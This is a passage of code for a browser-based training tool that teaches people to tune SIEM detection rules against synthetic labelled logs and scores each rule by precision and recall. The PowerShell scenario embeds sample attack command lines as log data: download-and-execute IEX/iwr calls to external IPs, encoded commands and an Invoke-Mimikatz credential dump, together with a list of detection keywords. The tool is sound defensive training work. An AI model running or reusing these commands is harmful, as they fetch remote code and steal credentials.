+  // FP: cloud sync (Dropbox-like) by legit users — large but to known good destination
+  for (let i = 0; i < 5; i++) {
+    logs.push({
+      _label: 'fp',
+      _ts: NOW - (15000 + i * 5000) * 1000,
+      timestamp: tsAt(15000 + i * 5000),
+      source: 'firewall',
+      severity: 'info',
+      action: 'ALLOW',
+      user: pick(['jdoe', 'asmith', 'mjohnson']),
+      src_ip: '10.4.' + randInt(12, 14) + '.' + randInt(20, 99),
+      dst_ip: '162.125.' + randInt(1, 250) + '.' + randInt(1, 250),
+      port: 443,
+      bytes_out: randInt(15_000_000, 60_000_000),
+      dst_category: 'sanctioned-saas',
+      message: 'ALLOW TCP cloud storage sync to sanctioned provider'
+    });
+  }
+
+  // FP: software update download (large inbound that some shops might confuse for outbound)
+  for (let i = 0; i < 3; i++) {
+    logs.push({
+      _label: 'fp',
+      _ts: NOW - (22000 + i * 4000) * 1000,
+      timestamp: tsAt(22000 + i * 4000),
+      source: 'firewall',
+      severity: 'info',
+      action: 'ALLOW',
+      user: 'system',
+      src_ip: '10.4.' + randInt(12, 14) + '.' + randInt(20, 99),
+      dst_ip: '52.94.' + randInt(1, 250) + '.' + randInt(1, 250),
+      port: 443,
+      bytes_out: randInt(11_000_000, 18_000_000),
+      dst_category: 'sanctioned-saas',
+      message: 'ALLOW TCP software update'
+    });
+  }
+
+  // NOISE: normal small outbound traffic
+  for (let i = 0; i < 80; i++) {
+    const t = randInt(0, 86400);
+    logs.push({
+      _label: 'noise',
+      _ts: NOW - t * 1000,
+      timestamp: tsAt(t),
+      source: 'firewall',
+      severity: 'info',
+      action: 'ALLOW',
+      user: pick(['jdoe', 'asmith', 'mjohnson', 'klee', 'tnguyen', 'system']),
+      src_ip: '10.4.' + randInt(12, 14) + '.' + randInt(20, 99),
+      dst_ip: pick(['52.94.5.10', '142.250.80.46', '104.18.2.35', '8.8.8.8']),
+      port: pick([80, 443, 443, 443]),
+      bytes_out: randInt(500, 2_500_000),
+      dst_category: 'sanctioned-saas',
+      message: 'ALLOW TCP normal traffic'
+    });
+  }
+  // NOISE: small connections to external (some to suspicious IPs but small) — should NOT alert
+  for (let i = 0; i < 12; i++) {
+    const t = randInt(0, 86400);
+    logs.push({
+      _label: 'noise',
+      _ts: NOW - t * 1000,
+      timestamp: tsAt(t),
+      source: 'firewall',
+      severity: 'info',
+      action: 'ALLOW',
+      user: pick(['jdoe', 'klee']),
+      src_ip: '10.4.' + randInt(12, 14) + '.' + randInt(20, 99),
+      dst_ip: pick(suspIPs),
+      port: 443,
+      bytes_out: randInt(2000, 800_000),
+      dst_category: 'unknown',
+      message: 'ALLOW TCP small connection'
+    });
+  }
+
+  return {
+    logs,
+    fields: ['source', 'severity', 'action', 'user', 'src_ip', 'dst_ip', 'port', 'bytes_out', 'dst_category']
+  };
+}
+
+function scenarioPowerShell() {
+  setSeed(0x9051E110);
+  const logs = [];
+
+  // TPs — clearly malicious PS use
+  const tps = [
+    { host: 'ws-441', user: 'jdoe',     cmd: 'powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAA9AE4AZQB3AC0ATwBiAGoAZQBjAHQA' },
+    { host: 'ws-302', user: 'asmith',   cmd: 'powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIA' },
+    { host: 'ws-218', user: 'mjohnson', cmd: 'powershell.exe IEX(New-Object Net.WebClient).DownloadString("http://185.220.101.45/a.ps1")' },
+    { host: 'ws-512', user: 'klee',     cmd: 'powershell.exe Invoke-Mimikatz -DumpCreds' },
+    { host: 'ws-180', user: 'tnguyen',  cmd: 'powershell.exe -nop -ep bypass -c "iex (iwr http://45.95.168.77/loader)"' },
+    { host: 'ws-441', user: 'jdoe',     cmd: 'powershell.exe -ExecutionPolicy Bypass -EncodedCommand SQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoA' },
+  ];
+  tps.forEach((t, i) => {
+    logs.push({
+      _label: 'tp',
+      _ts: NOW - (1500 + i * 900) * 1000,
+      timestamp: tsAt(1500 + i * 900),
+      source: 'endpoint-edr',
+      severity: 'critical',
+      action: 'PROCESS_START',
+      user: t.user,
+      host: t.host,
+      process: 'powershell.exe',
+      message: `[${t.host}] process_start cmdline="${t.cmd}" parent=cmd.exe`
+    });
+  });
+
+  // FP: legit admin scripts on known admin host
+  const fps = [
+    { host: 'srv-admin-01', user: 'sysadmin', cmd: 'powershell.exe -File C:\\scripts\\WeeklyMaintenance.ps1' },
+    { host: 'srv-admin-01', user: 'sysadmin', cmd: 'powershell.exe Get-ADUser -Filter * | Export-Csv users.csv' },
+    { host: 'srv-admin-01', user: 'sysadmin', cmd: 'powershell.exe Restart-Service -Name "WinRM"' },
+    { host: 'srv-mon-01',   user: 'svc-monitor', cmd: 'powershell.exe -File C:\\monitor\\HealthCheck.ps1' },
+    // Sneaky FP — admin uses encoded command for legit reason on admin host
+    { host: 'srv-admin-01', user: 'sysadmin', cmd: 'powershell.exe -EncodedCommand RwBlAHQALQBQAHIAbwBjAGUAcwBzAA== ' },
+  ];
+  fps.forEach((f, i) => {
+    logs.push({
+      _label: 'fp',
+      _ts: NOW - (5000 + i * 1200) * 1000,
+      timestamp: tsAt(5000 + i * 1200),
+      source: 'endpoint-edr',
+      severity: 'info',
+      action: 'PROCESS_START',
+      user: f.user,
+      host: f.host,
+      process: 'powershell.exe',
+      message: `[${f.host}] process_start cmdline="${f.cmd}"`
+    });
+  });
+
+  // NOISE — other EDR events
+  for (let i = 0; i < 50; i++) {
+    const t = randInt(0, 86400);
+    const proc = pick(['cmd.exe', 'svchost.exe', 'explorer.exe', 'chrome.exe', 'outlook.exe', 'teams.exe', 'rundll32.exe']);
+    const host = pick(['ws-' + randInt(100, 600), 'laptop-' + randInt(100, 999), 'srv-' + randInt(10, 99)]);
+    logs.push({
+      _label: 'noise',
+      _ts: NOW - t * 1000,
+      timestamp: tsAt(t),
+      source: 'endpoint-edr',
+      severity: 'info',
+      action: 'PROCESS_START',
+      user: pick(['jdoe', 'asmith', 'mjohnson', 'klee', 'tnguyen']),
+      host: host,
+      process: proc,
+      message: `[${host}] process_start ${proc} pid=${randInt(1000, 9999)}`
+    });
+  }
+  // NOISE — benign PS use on user workstations (Get-Help, etc.)
+  for (let i = 0; i < 10; i++) {
+    const t = randInt(0, 86400);
+    const host = 'ws-' + randInt(100, 600);
+    logs.push({
+      _label: 'noise',
+      _ts: NOW - t * 1000,
+      timestamp: tsAt(t),
+      source: 'endpoint-edr',
+      severity: 'info',
+      action: 'PROCESS_START',
+      user: pick(['jdoe', 'asmith', 'klee']),
+      host: host,
+      process: 'powershell.exe',
+      message: `[${host}] process_start cmdline="powershell.exe ${pick(['Get-Help', 'Get-Date', 'Get-Process | Select Name'])}"`
+    });
+  }
+
+  return {
+    logs,
+    fields: ['source', 'severity', 'action', 'user', 'host', 'process']
+  };
+}
+
+const SCENARIOS = {
+  brute_force: {
+    id: 'brute_force',
+    name: 'Brute Force Login',
+    title: 'Detect login brute force attacks',
+    objective: 'Catch sustained login failure bursts targeting privileged accounts. Avoid alerting on routine user typos and noisy service accounts.',
+    hint: 'Match auth-server failures, then enable a count-based threshold (≥10) over a short window (e.g. 300s) grouped by <code>src_ip</code> or <code>user</code>. Add an exclusion for service users (<code>user starts_with svc-</code>) and consider excluding internal source IPs (<code>src_ip starts_with 10.</code>).',
+    suggestNaive: () => ({
+      name: 'Auth Failure',
+      severity: 'warning',
+      match: [{ field: 'action', op: 'equals', value: 'LOGIN' }, { field: 'status', op: 'equals', value: 'failure' }],
+      exclude: [],
+      threshold: { enabled: false, count: 10, window: 300, group: '' }
+    }),
+    generate: scenarioBruteForce
+  },
+  sql_injection: {
+    id: 'sql_injection',
+    name: 'SQL Injection',
+    title: 'Detect SQL injection attempts at the WAF and app tier',
+    objective: 'Catch SQL injection attempts wherever they appear. Avoid alerting on legitimate searches that contain SQL-like words, internal app errors, and overridden WAF allows.',
+    hint: 'Match on <code>attack_type equals "SQL Injection"</code> for WAF events, and consider catching app-tier evidence too (e.g. message <code>contains</code> SQL injection signatures like <code>UNION SELECT</code>, <code>OR 1=1</code>). Exclude <code>action equals ALLOW</code> (overridden alerts) and internal source IPs that produced false positives.',
+    suggestNaive: () => ({
+      name: 'SQLi Catch-All',
+      severity: 'critical',
+      match: [{ field: 'message', op: 'contains', value: 'select' }],
+      exclude: [],
+      threshold: { enabled: false, count: 10, window: 300, group: '' }
+    }),
+    generate: scenarioSqlInjection
+  },
+  exfiltration: {
+    id: 'exfiltration',
+    name: 'Data Exfiltration',
+    title: 'Detect large outbound transfers to untrusted destinations',
+    objective: 'Catch large outbound transfers to suspicious external destinations. Avoid alerting on backup jobs, sanctioned cloud sync, and software updates.',
+    hint: 'Match <code>action equals ALLOW</code> with <code>bytes_out greater_than 10000000</code> (10MB). Exclude <code>dst_category equals internal-backup</code> and <code>dst_category equals sanctioned-saas</code>. The <code>dst_category</code> field is your friend — that\'s what threat intel enrichment is for.',
+    suggestNaive: () => ({
+      name: 'Big Outbound',
+      severity: 'warning',
+      match: [{ field: 'bytes_out', op: 'greater_than', value: '1000000' }],
+      exclude: [],
+      threshold: { enabled: false, count: 10, window: 300, group: '' }
+    }),
+    generate: scenarioExfiltration
+  },
+  powershell: {
+    id: 'powershell',
+    name: 'Suspicious PowerShell',
+    title: 'Detect malicious PowerShell execution',
+    objective: 'Catch suspicious PS use (encoded commands, IEX downloaders, Mimikatz). Avoid alerting on routine admin scripting from known admin hosts.',
+    hint: 'Match <code>process equals powershell.exe</code>, then add separate match conditions for the indicators (or build several variants). Suspicious markers in <code>message</code>: <code>EncodedCommand</code>, <code>-enc</code>, <code>IEX</code>, <code>DownloadString</code>, <code>Invoke-Mimikatz</code>, <code>iwr http</code>. Exclude trusted admin hosts (<code>host starts_with srv-admin</code>, <code>host starts_with srv-mon</code>) — but be careful, that exclusion can mask a real compromise of an admin box.',
+    suggestNaive: () => ({
+      name: 'Any PowerShell',
+      severity: 'warning',
+      match: [{ field: 'process', op: 'equals', value: 'powershell.exe' }],
+      exclude: [],
+      threshold: { enabled: false, count: 10, window: 300, group: '' }
+    }),
+    generate: scenarioPowerShell
+  }
+};
+
+const FIELDS_ALL = ['source', 'severity', 'action', 'status', 'user', 'src_ip', 'dst_ip', 'port', 'bytes_out', 'dst_category', 'attack_type', 'host', 'process', 'message', 'ruleset'];
+const OPERATORS = [
+  { v: 'equals', l: 'equals' },
+  { v: 'not_equals', l: 'not equals' },
+  { v: 'contains', l: 'contains' },
+  { v: 'not_contains', l: 'not contains' },
+  { v: 'starts_with', l: 'starts with' },
+  { v: 'ends_with', l: 'ends with' },
+  { v: 'matches', l: 'matches (wildcard *)' },
+  { v: 'regex', l: 'regex' },
+  { v: 'greater_than', l: 'greater than (>)' },
+  { v: 'less_than', l: 'less than (<)' },
+  { v: 'in', l: 'in (comma list)' },
+];
+
+// ============================================================
+// RULE EVALUATION
+// ============================================================
+function evaluateCondition(log, cond) {
+  const fv = log[cond.field];
+  if (fv === undefined || fv === null) return false;
+  const fvStr = String(fv).toLowerCase();
+  const valStr = String(cond.value).toLowerCase();
+  switch (cond.op) {
+    case 'equals': return fvStr === valStr;
+    case 'not_equals': return fvStr !== valStr;
+    case 'contains': return fvStr.includes(valStr);
+    case 'not_contains': return !fvStr.includes(valStr);
+    case 'starts_with': return fvStr.startsWith(valStr);
+    case 'ends_with': return fvStr.endsWith(valStr);
+    case 'matches': {
+      const re = new RegExp('^' + valStr.split('').map(c => c === '*' ? '.*' : c === '?' ? '.' : c.replace(/[-\/\\^$+?.()|[\]{}]/g, '\\$&')).join('') + '$', 'i');
+      return re.test(fvStr);
+    }
+    case 'regex': {
+      try { return new RegExp(cond.value, 'i').test(fvStr); } catch { return false; }
+    }
+    case 'greater_than': return Number(fv) > Number(cond.value);
+    case 'less_than': return Number(fv) < Number(cond.value);
+    case 'in': return cond.value.split(',').map(s => s.trim().toLowerCase()).includes(fvStr);
+  }
+  return false;
+}
+
+function evaluateRule(rule, logs) {
+  // Step 1: filter by match (all AND)
+  let matching = logs.filter(l => rule.match.length === 0 ? false : rule.match.every(c => evaluateCondition(l, c)));
+  // Step 2: apply exclusions (OR — drop if any matches)
+  if (rule.exclude.length > 0) {
+    matching = matching.filter(l => !rule.exclude.some(c => evaluateCondition(l, c)));
+  }
+  // Step 3: threshold/aggregation
+  if (rule.threshold.enabled) {
+    const count = parseInt(rule.threshold.count) || 1;
+    const windowMs = (parseInt(rule.threshold.window) || 60) * 1000;
+    const groupField = rule.threshold.group;
+    // Group events
+    const groups = new Map();
+    for (const log of matching) {
+      const key = groupField ? String(log[groupField] ?? '__null__') : '__all__';
+      if (!groups.has(key)) groups.set(key, []);
+      groups.get(key).push(log);
+    }
+    const triggered = new Set();
+    for (const [, events] of groups) {
+      events.sort((a, b) => a._ts - b._ts);
+      // Sliding window: for each event, find the earliest event within windowMs
+      let lo = 0;
+      for (let hi = 0; hi < events.length; hi++) {
+        while (events[hi]._ts - events[lo]._ts > windowMs) lo++;
+        if (hi - lo + 1 >= count) {
+          // mark all events in this window as triggered
+          for (let k = lo; k <= hi; k++) triggered.add(events[k]);
+        }
+      }
+    }
+    return Array.from(triggered);
+  }
+  return matching;
+}
+
+// ============================================================
+// UI
+// ============================================================
+const $ = id => document.getElementById(id);
+let currentScenario = null;
+let currentTab = 'tp';
+let lastResult = null;
+
+function buildScenarioTabs() {
+  const c = $('scenario-tabs');
+  c.innerHTML = '';
+  Object.values(SCENARIOS).forEach(s => {
+    const b = document.createElement('button');
+    b.className = 'scenario-tab';
+    b.textContent = s.name;
+    b.dataset.id = s.id;
+    b.addEventListener('click', () => loadScenario(s.id));
+    c.appendChild(b);
+  });
+}
+
+function loadScenario(id) {
+  currentScenario = SCENARIOS[id];
+  document.querySelectorAll('.scenario-tab').forEach(t => t.classList.toggle('active', t.dataset.id === id));
+  // Brief
+  const labelCounts = currentScenario.generate().logs.reduce((acc, l) => { acc[l._label] = (acc[l._label] || 0) + 1; return acc; }, {});
+  $('brief').innerHTML = `
+    <h2>${currentScenario.title}</h2>
+    <div class="obj">${currentScenario.objective}</div>
+    <button class="hint-toggle" onclick="this.nextElementSibling.classList.toggle('show')">▸ Show tuning hint</button>
+    <div class="hint-text">${currentScenario.hint}</div>
+    <div class="corpus-stats">
+      <span>Total events: <b>${labelCounts.tp + labelCounts.fp + labelCounts.noise}</b></span>
+      <span>Real attacks: <b style="color:var(--green)">${labelCounts.tp || 0}</b></span>
+      <span>FP candidates: <b style="color:var(--red)">${labelCounts.fp || 0}</b></span>
+      <span>Background: <b>${labelCounts.noise || 0}</b></span>
+    </div>
+  `;
+  // Reset rule
+  resetRule();
+  // Empty results
+  $('verdict').className = 'verdict empty';
+  $('verdict').textContent = 'Build a rule and click Test to evaluate';
+  $('precision').textContent = '—'; $('precision').className = 'val neutral';
+  $('recall').textContent = '—'; $('recall').className = 'val neutral';
+  $('f1').textContent = '—'; $('f1').className = 'val neutral';
+  $('cnt-tp').textContent = '0'; $('cnt-fp').textContent = '0'; $('cnt-fn').textContent = '0'; $('cnt-total').textContent = '0';
+  $('event-list').innerHTML = `<div class="empty-state"><div class="sym">∅</div>Run your rule to see triggered events, missed attacks, and false positives.</div>`;
+  $('last-run').textContent = 'no run yet';
+}
+
+function buildConditionRow(cond, container) {
+  const row = document.createElement('div');
+  row.className = 'condition-row';
+  row.innerHTML = `
+    <select class="field-select c-field">
+      ${FIELDS_ALL.map(f => `<option value="${f}" ${cond.field === f ? 'selected' : ''}>${f}</option>`).join('')}
+    </select>
+    <select class="field-select c-op">
+      ${OPERATORS.map(o => `<option value="${o.v}" ${cond.op === o.v ? 'selected' : ''}>${o.l}</option>`).join('')}
+    </select>
+    <input type="text" class="field-input c-val" placeholder="value" value="${escapeAttr(cond.value || '')}">
+    <button class="icon-btn c-rm" title="Remove">×</button>
+  `;
+  row.querySelector('.c-rm').addEventListener('click', () => row.remove());
+  container.appendChild(row);
+}
+
+function escapeAttr(s) { return String(s).replace(/"/g, '&quot;'); }
+function escapeHtml(s) { return String(s).replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c])); }
+
+function readRule() {
+  const readGroup = (containerId) => Array.from(document.getElementById(containerId).querySelectorAll('.condition-row')).map(r => ({
+    field: r.querySelector('.c-field').value,
+    op: r.querySelector('.c-op').value,
+    value: r.querySelector('.c-val').value
+  })).filter(c => c.value !== '' || c.op === 'equals' || c.op === 'not_equals');
+  return {
+    name: $('rule-name').value || 'unnamed_rule',
+    severity: $('rule-severity').value,
+    match: readGroup('match-conditions'),
+    exclude: readGroup('exclude-conditions'),
+    threshold: {
+      enabled: $('threshold-enabled').checked,
+      count: $('threshold-count').value,
+      window: $('threshold-window').value,
+      group: $('threshold-group').value
+    }
+  };
+}
+
+function writeRule(rule) {
+  $('rule-name').value = rule.name || '';
+  $('rule-severity').value = rule.severity || 'warning';
+  $('match-conditions').innerHTML = '';
+  (rule.match || []).forEach(c => buildConditionRow(c, $('match-conditions')));
+  $('exclude-conditions').innerHTML = '';
+  (rule.exclude || []).forEach(c => buildConditionRow(c, $('exclude-conditions')));
+  const t = rule.threshold || { enabled: false, count: 10, window: 300, group: '' };
+  $('threshold-enabled').checked = !!t.enabled;
+  $('threshold-body').classList.toggle('show', !!t.enabled);
+  $('threshold-count').value = t.count;
+  $('threshold-window').value = t.window;
+  $('threshold-group').value = t.group || '';
+}
+
+function resetRule() {
+  writeRule({
+    name: '',
+    severity: 'warning',
+    match: [{ field: 'source', op: 'equals', value: '' }],
+    exclude: [],
+    threshold: { enabled: false, count: 10, window: 300, group: '' }
+  });
+}
+
+function loadNaiveRule() {
+  if (!currentScenario) return;
+  writeRule(currentScenario.suggestNaive());
+}
+
+function runRule() {
+  if (!currentScenario) return;
+  const rule = readRule();
+  const { logs } = currentScenario.generate();
+  const triggered = new Set(evaluateRule(rule, logs));
+
+  let tp = 0, fp = 0, fn = 0, tn = 0;
+  for (const l of logs) {
+    const fired = triggered.has(l);
+    if (fired && l._label === 'tp') tp++;
+    else if (fired && (l._label === 'fp' || l._label === 'noise')) fp++;
+    else if (!fired && l._label === 'tp') fn++;
+    else tn++;
+  }
+
+  const precision = (tp + fp) === 0 ? null : tp / (tp + fp);
+  const recall = (tp + fn) === 0 ? null : tp / (tp + fn);
+  const f1 = (precision !== null && recall !== null && (precision + recall) > 0) ? 2 * precision * recall / (precision + recall) : null;
+
+  lastResult = { rule, logs, triggered, tp, fp, fn, tn, precision, recall, f1 };
+
+  // Update score cards
+  const fmt = v => v === null ? '—' : (v * 100).toFixed(0) + '%';
+  const cls = v => v === null ? 'neutral' : v >= 0.95 ? 'good' : v >= 0.7 ? 'med' : 'bad';
+  $('precision').textContent = fmt(precision); $('precision').className = 'val ' + cls(precision);
+  $('recall').textContent = fmt(recall); $('recall').className = 'val ' + cls(recall);
+  $('f1').textContent = fmt(f1); $('f1').className = 'val ' + cls(f1);
+  $('cnt-tp').textContent = tp;
+  $('cnt-fp').textContent = fp;
+  $('cnt-fn').textContent = fn;
+  $('cnt-total').textContent = logs.length;
+
+  // Verdict
+  const v = $('verdict');
+  v.classList.remove('empty', 'good', 'med', 'bad', 'perfect');
+  if (rule.match.length === 0) {
+    v.classList.add('bad');
+    v.textContent = '✗ Rule has no match conditions';
+  } else if (tp === 0 && fp === 0) {
+    v.classList.add('bad');
+    v.textContent = '✗ Rule fires on nothing — too restrictive';
+  } else if (fp === 0 && fn === 0) {
+    v.classList.add('perfect');
+    v.textContent = '✓ Perfect — 100% precision and recall';
+  } else if (f1 >= 0.9) {
+    v.classList.add('good');
+    v.textContent = `✓ Strong rule — F1 ${(f1*100).toFixed(0)}%`;
+  } else if (f1 >= 0.6) {
+    v.classList.add('med');
+    v.textContent = `⚠ Needs tuning — ${fp} false positive${fp!==1?'s':''}, ${fn} missed`;
+  } else {
+    v.classList.add('bad');
+    v.textContent = `✗ Poor signal — ${fp} false positive${fp!==1?'s':''}, ${fn} missed`;
+  }
+
+  $('last-run').textContent = `evaluated ${logs.length} events`;
+  switchTab(currentTab);
+}
+
+function switchTab(tab) {
+  currentTab = tab;
+  document.querySelectorAll('.bd-cell').forEach(c => c.classList.toggle('active', c.dataset.tab === tab));
+  if (!lastResult) return;
+  const { logs, triggered } = lastResult;
+  let filtered;
+  if (tab === 'tp') filtered = logs.filter(l => triggered.has(l) && l._label === 'tp');
+  else if (tab === 'fp') filtered = logs.filter(l => triggered.has(l) && l._label !== 'tp');
+  else if (tab === 'fn') filtered = logs.filter(l => !triggered.has(l) && l._label === 'tp');
+  else filtered = [...logs].sort((a, b) => b._ts - a._ts);
+
+  if (filtered.length === 0) {
+    const msgs = {
+      tp: 'No true positives detected — your rule did not catch any real attacks',
+      fp: 'No false positives — clean precision',
+      fn: 'No missed attacks — full recall',
+      all: 'No events'
+    };
+    $('event-list').innerHTML = `<div class="empty-state"><div class="sym">∅</div>${msgs[tab]}</div>`;
+    return;
+  }
+  // Sort: newest first
+  filtered.sort((a, b) => b._ts - a._ts);
+  $('event-list').innerHTML = filtered.slice(0, 100).map(l => {
+    const fired = triggered.has(l);
+    let cls = '';
+    let badge = '';
+    if (fired && l._label === 'tp') { cls = 'tp'; badge = 'TP'; }
+    else if (fired && l._label !== 'tp') { cls = 'fp'; badge = 'FP'; }
+    else if (!fired && l._label === 'tp') { cls = 'fn'; badge = 'MISSED'; }
+    else { cls = ''; badge = 'OK'; }
+    const meta = [
+      l.user && `user=${l.user}`,
+      l.src_ip && `src=${l.src_ip}`,
+      l.dst_ip && `dst=${l.dst_ip}`,
+      l.bytes_out && `bytes_out=${l.bytes_out}`,
+      l.host && `host=${l.host}`,
+      l.process && `process=${l.process}`,
+      l.attack_type && `attack=${l.attack_type}`,
+      l.dst_category && `category=${l.dst_category}`,
+      l.action && `action=${l.action}`,
+    ].filter(Boolean).join(' · ');
+    return `
+      <div class="event-row ${cls}">
+        <span class="badge">${badge}</span>
+        <span class="ts">${l.timestamp}<br><span style="color:var(--text-faint)">${l.source}</span></span>
+        <span class="msg">${escapeHtml(l.message)}<span class="meta">${escapeHtml(meta)}</span></span>
+      </div>
+    `;
+  }).join('') + (filtered.length > 100 ? `<div class="empty-state" style="padding:14px">+ ${filtered.length - 100} more not shown</div>` : '');
+}
+
+// ============================================================
+// WIRING
+// ============================================================
+$('add-match').addEventListener('click', () => buildConditionRow({ field: 'source', op: 'equals', value: '' }, $('match-conditions')));
+$('add-exclude').addEventListener('click', () => buildConditionRow({ field: 'source', op: 'equals', value: '' }, $('exclude-conditions')));
+$('threshold-enabled').addEventListener('change', e => $('threshold-body').classList.toggle('show', e.target.checked));
+$('run-rule').addEventListener('click', runRule);
+$('load-naive').addEventListener('click', loadNaiveRule);
+$('reset-link').addEventListener('click', e => { e.preventDefault(); resetRule(); });
+document.querySelectorAll('.bd-cell').forEach(c => c.addEventListener('click', () => switchTab(c.dataset.tab)));
+
+// Init
+buildScenarioTabs();
+loadScenario('brute_force');
+</script>
+</body>
+</html>
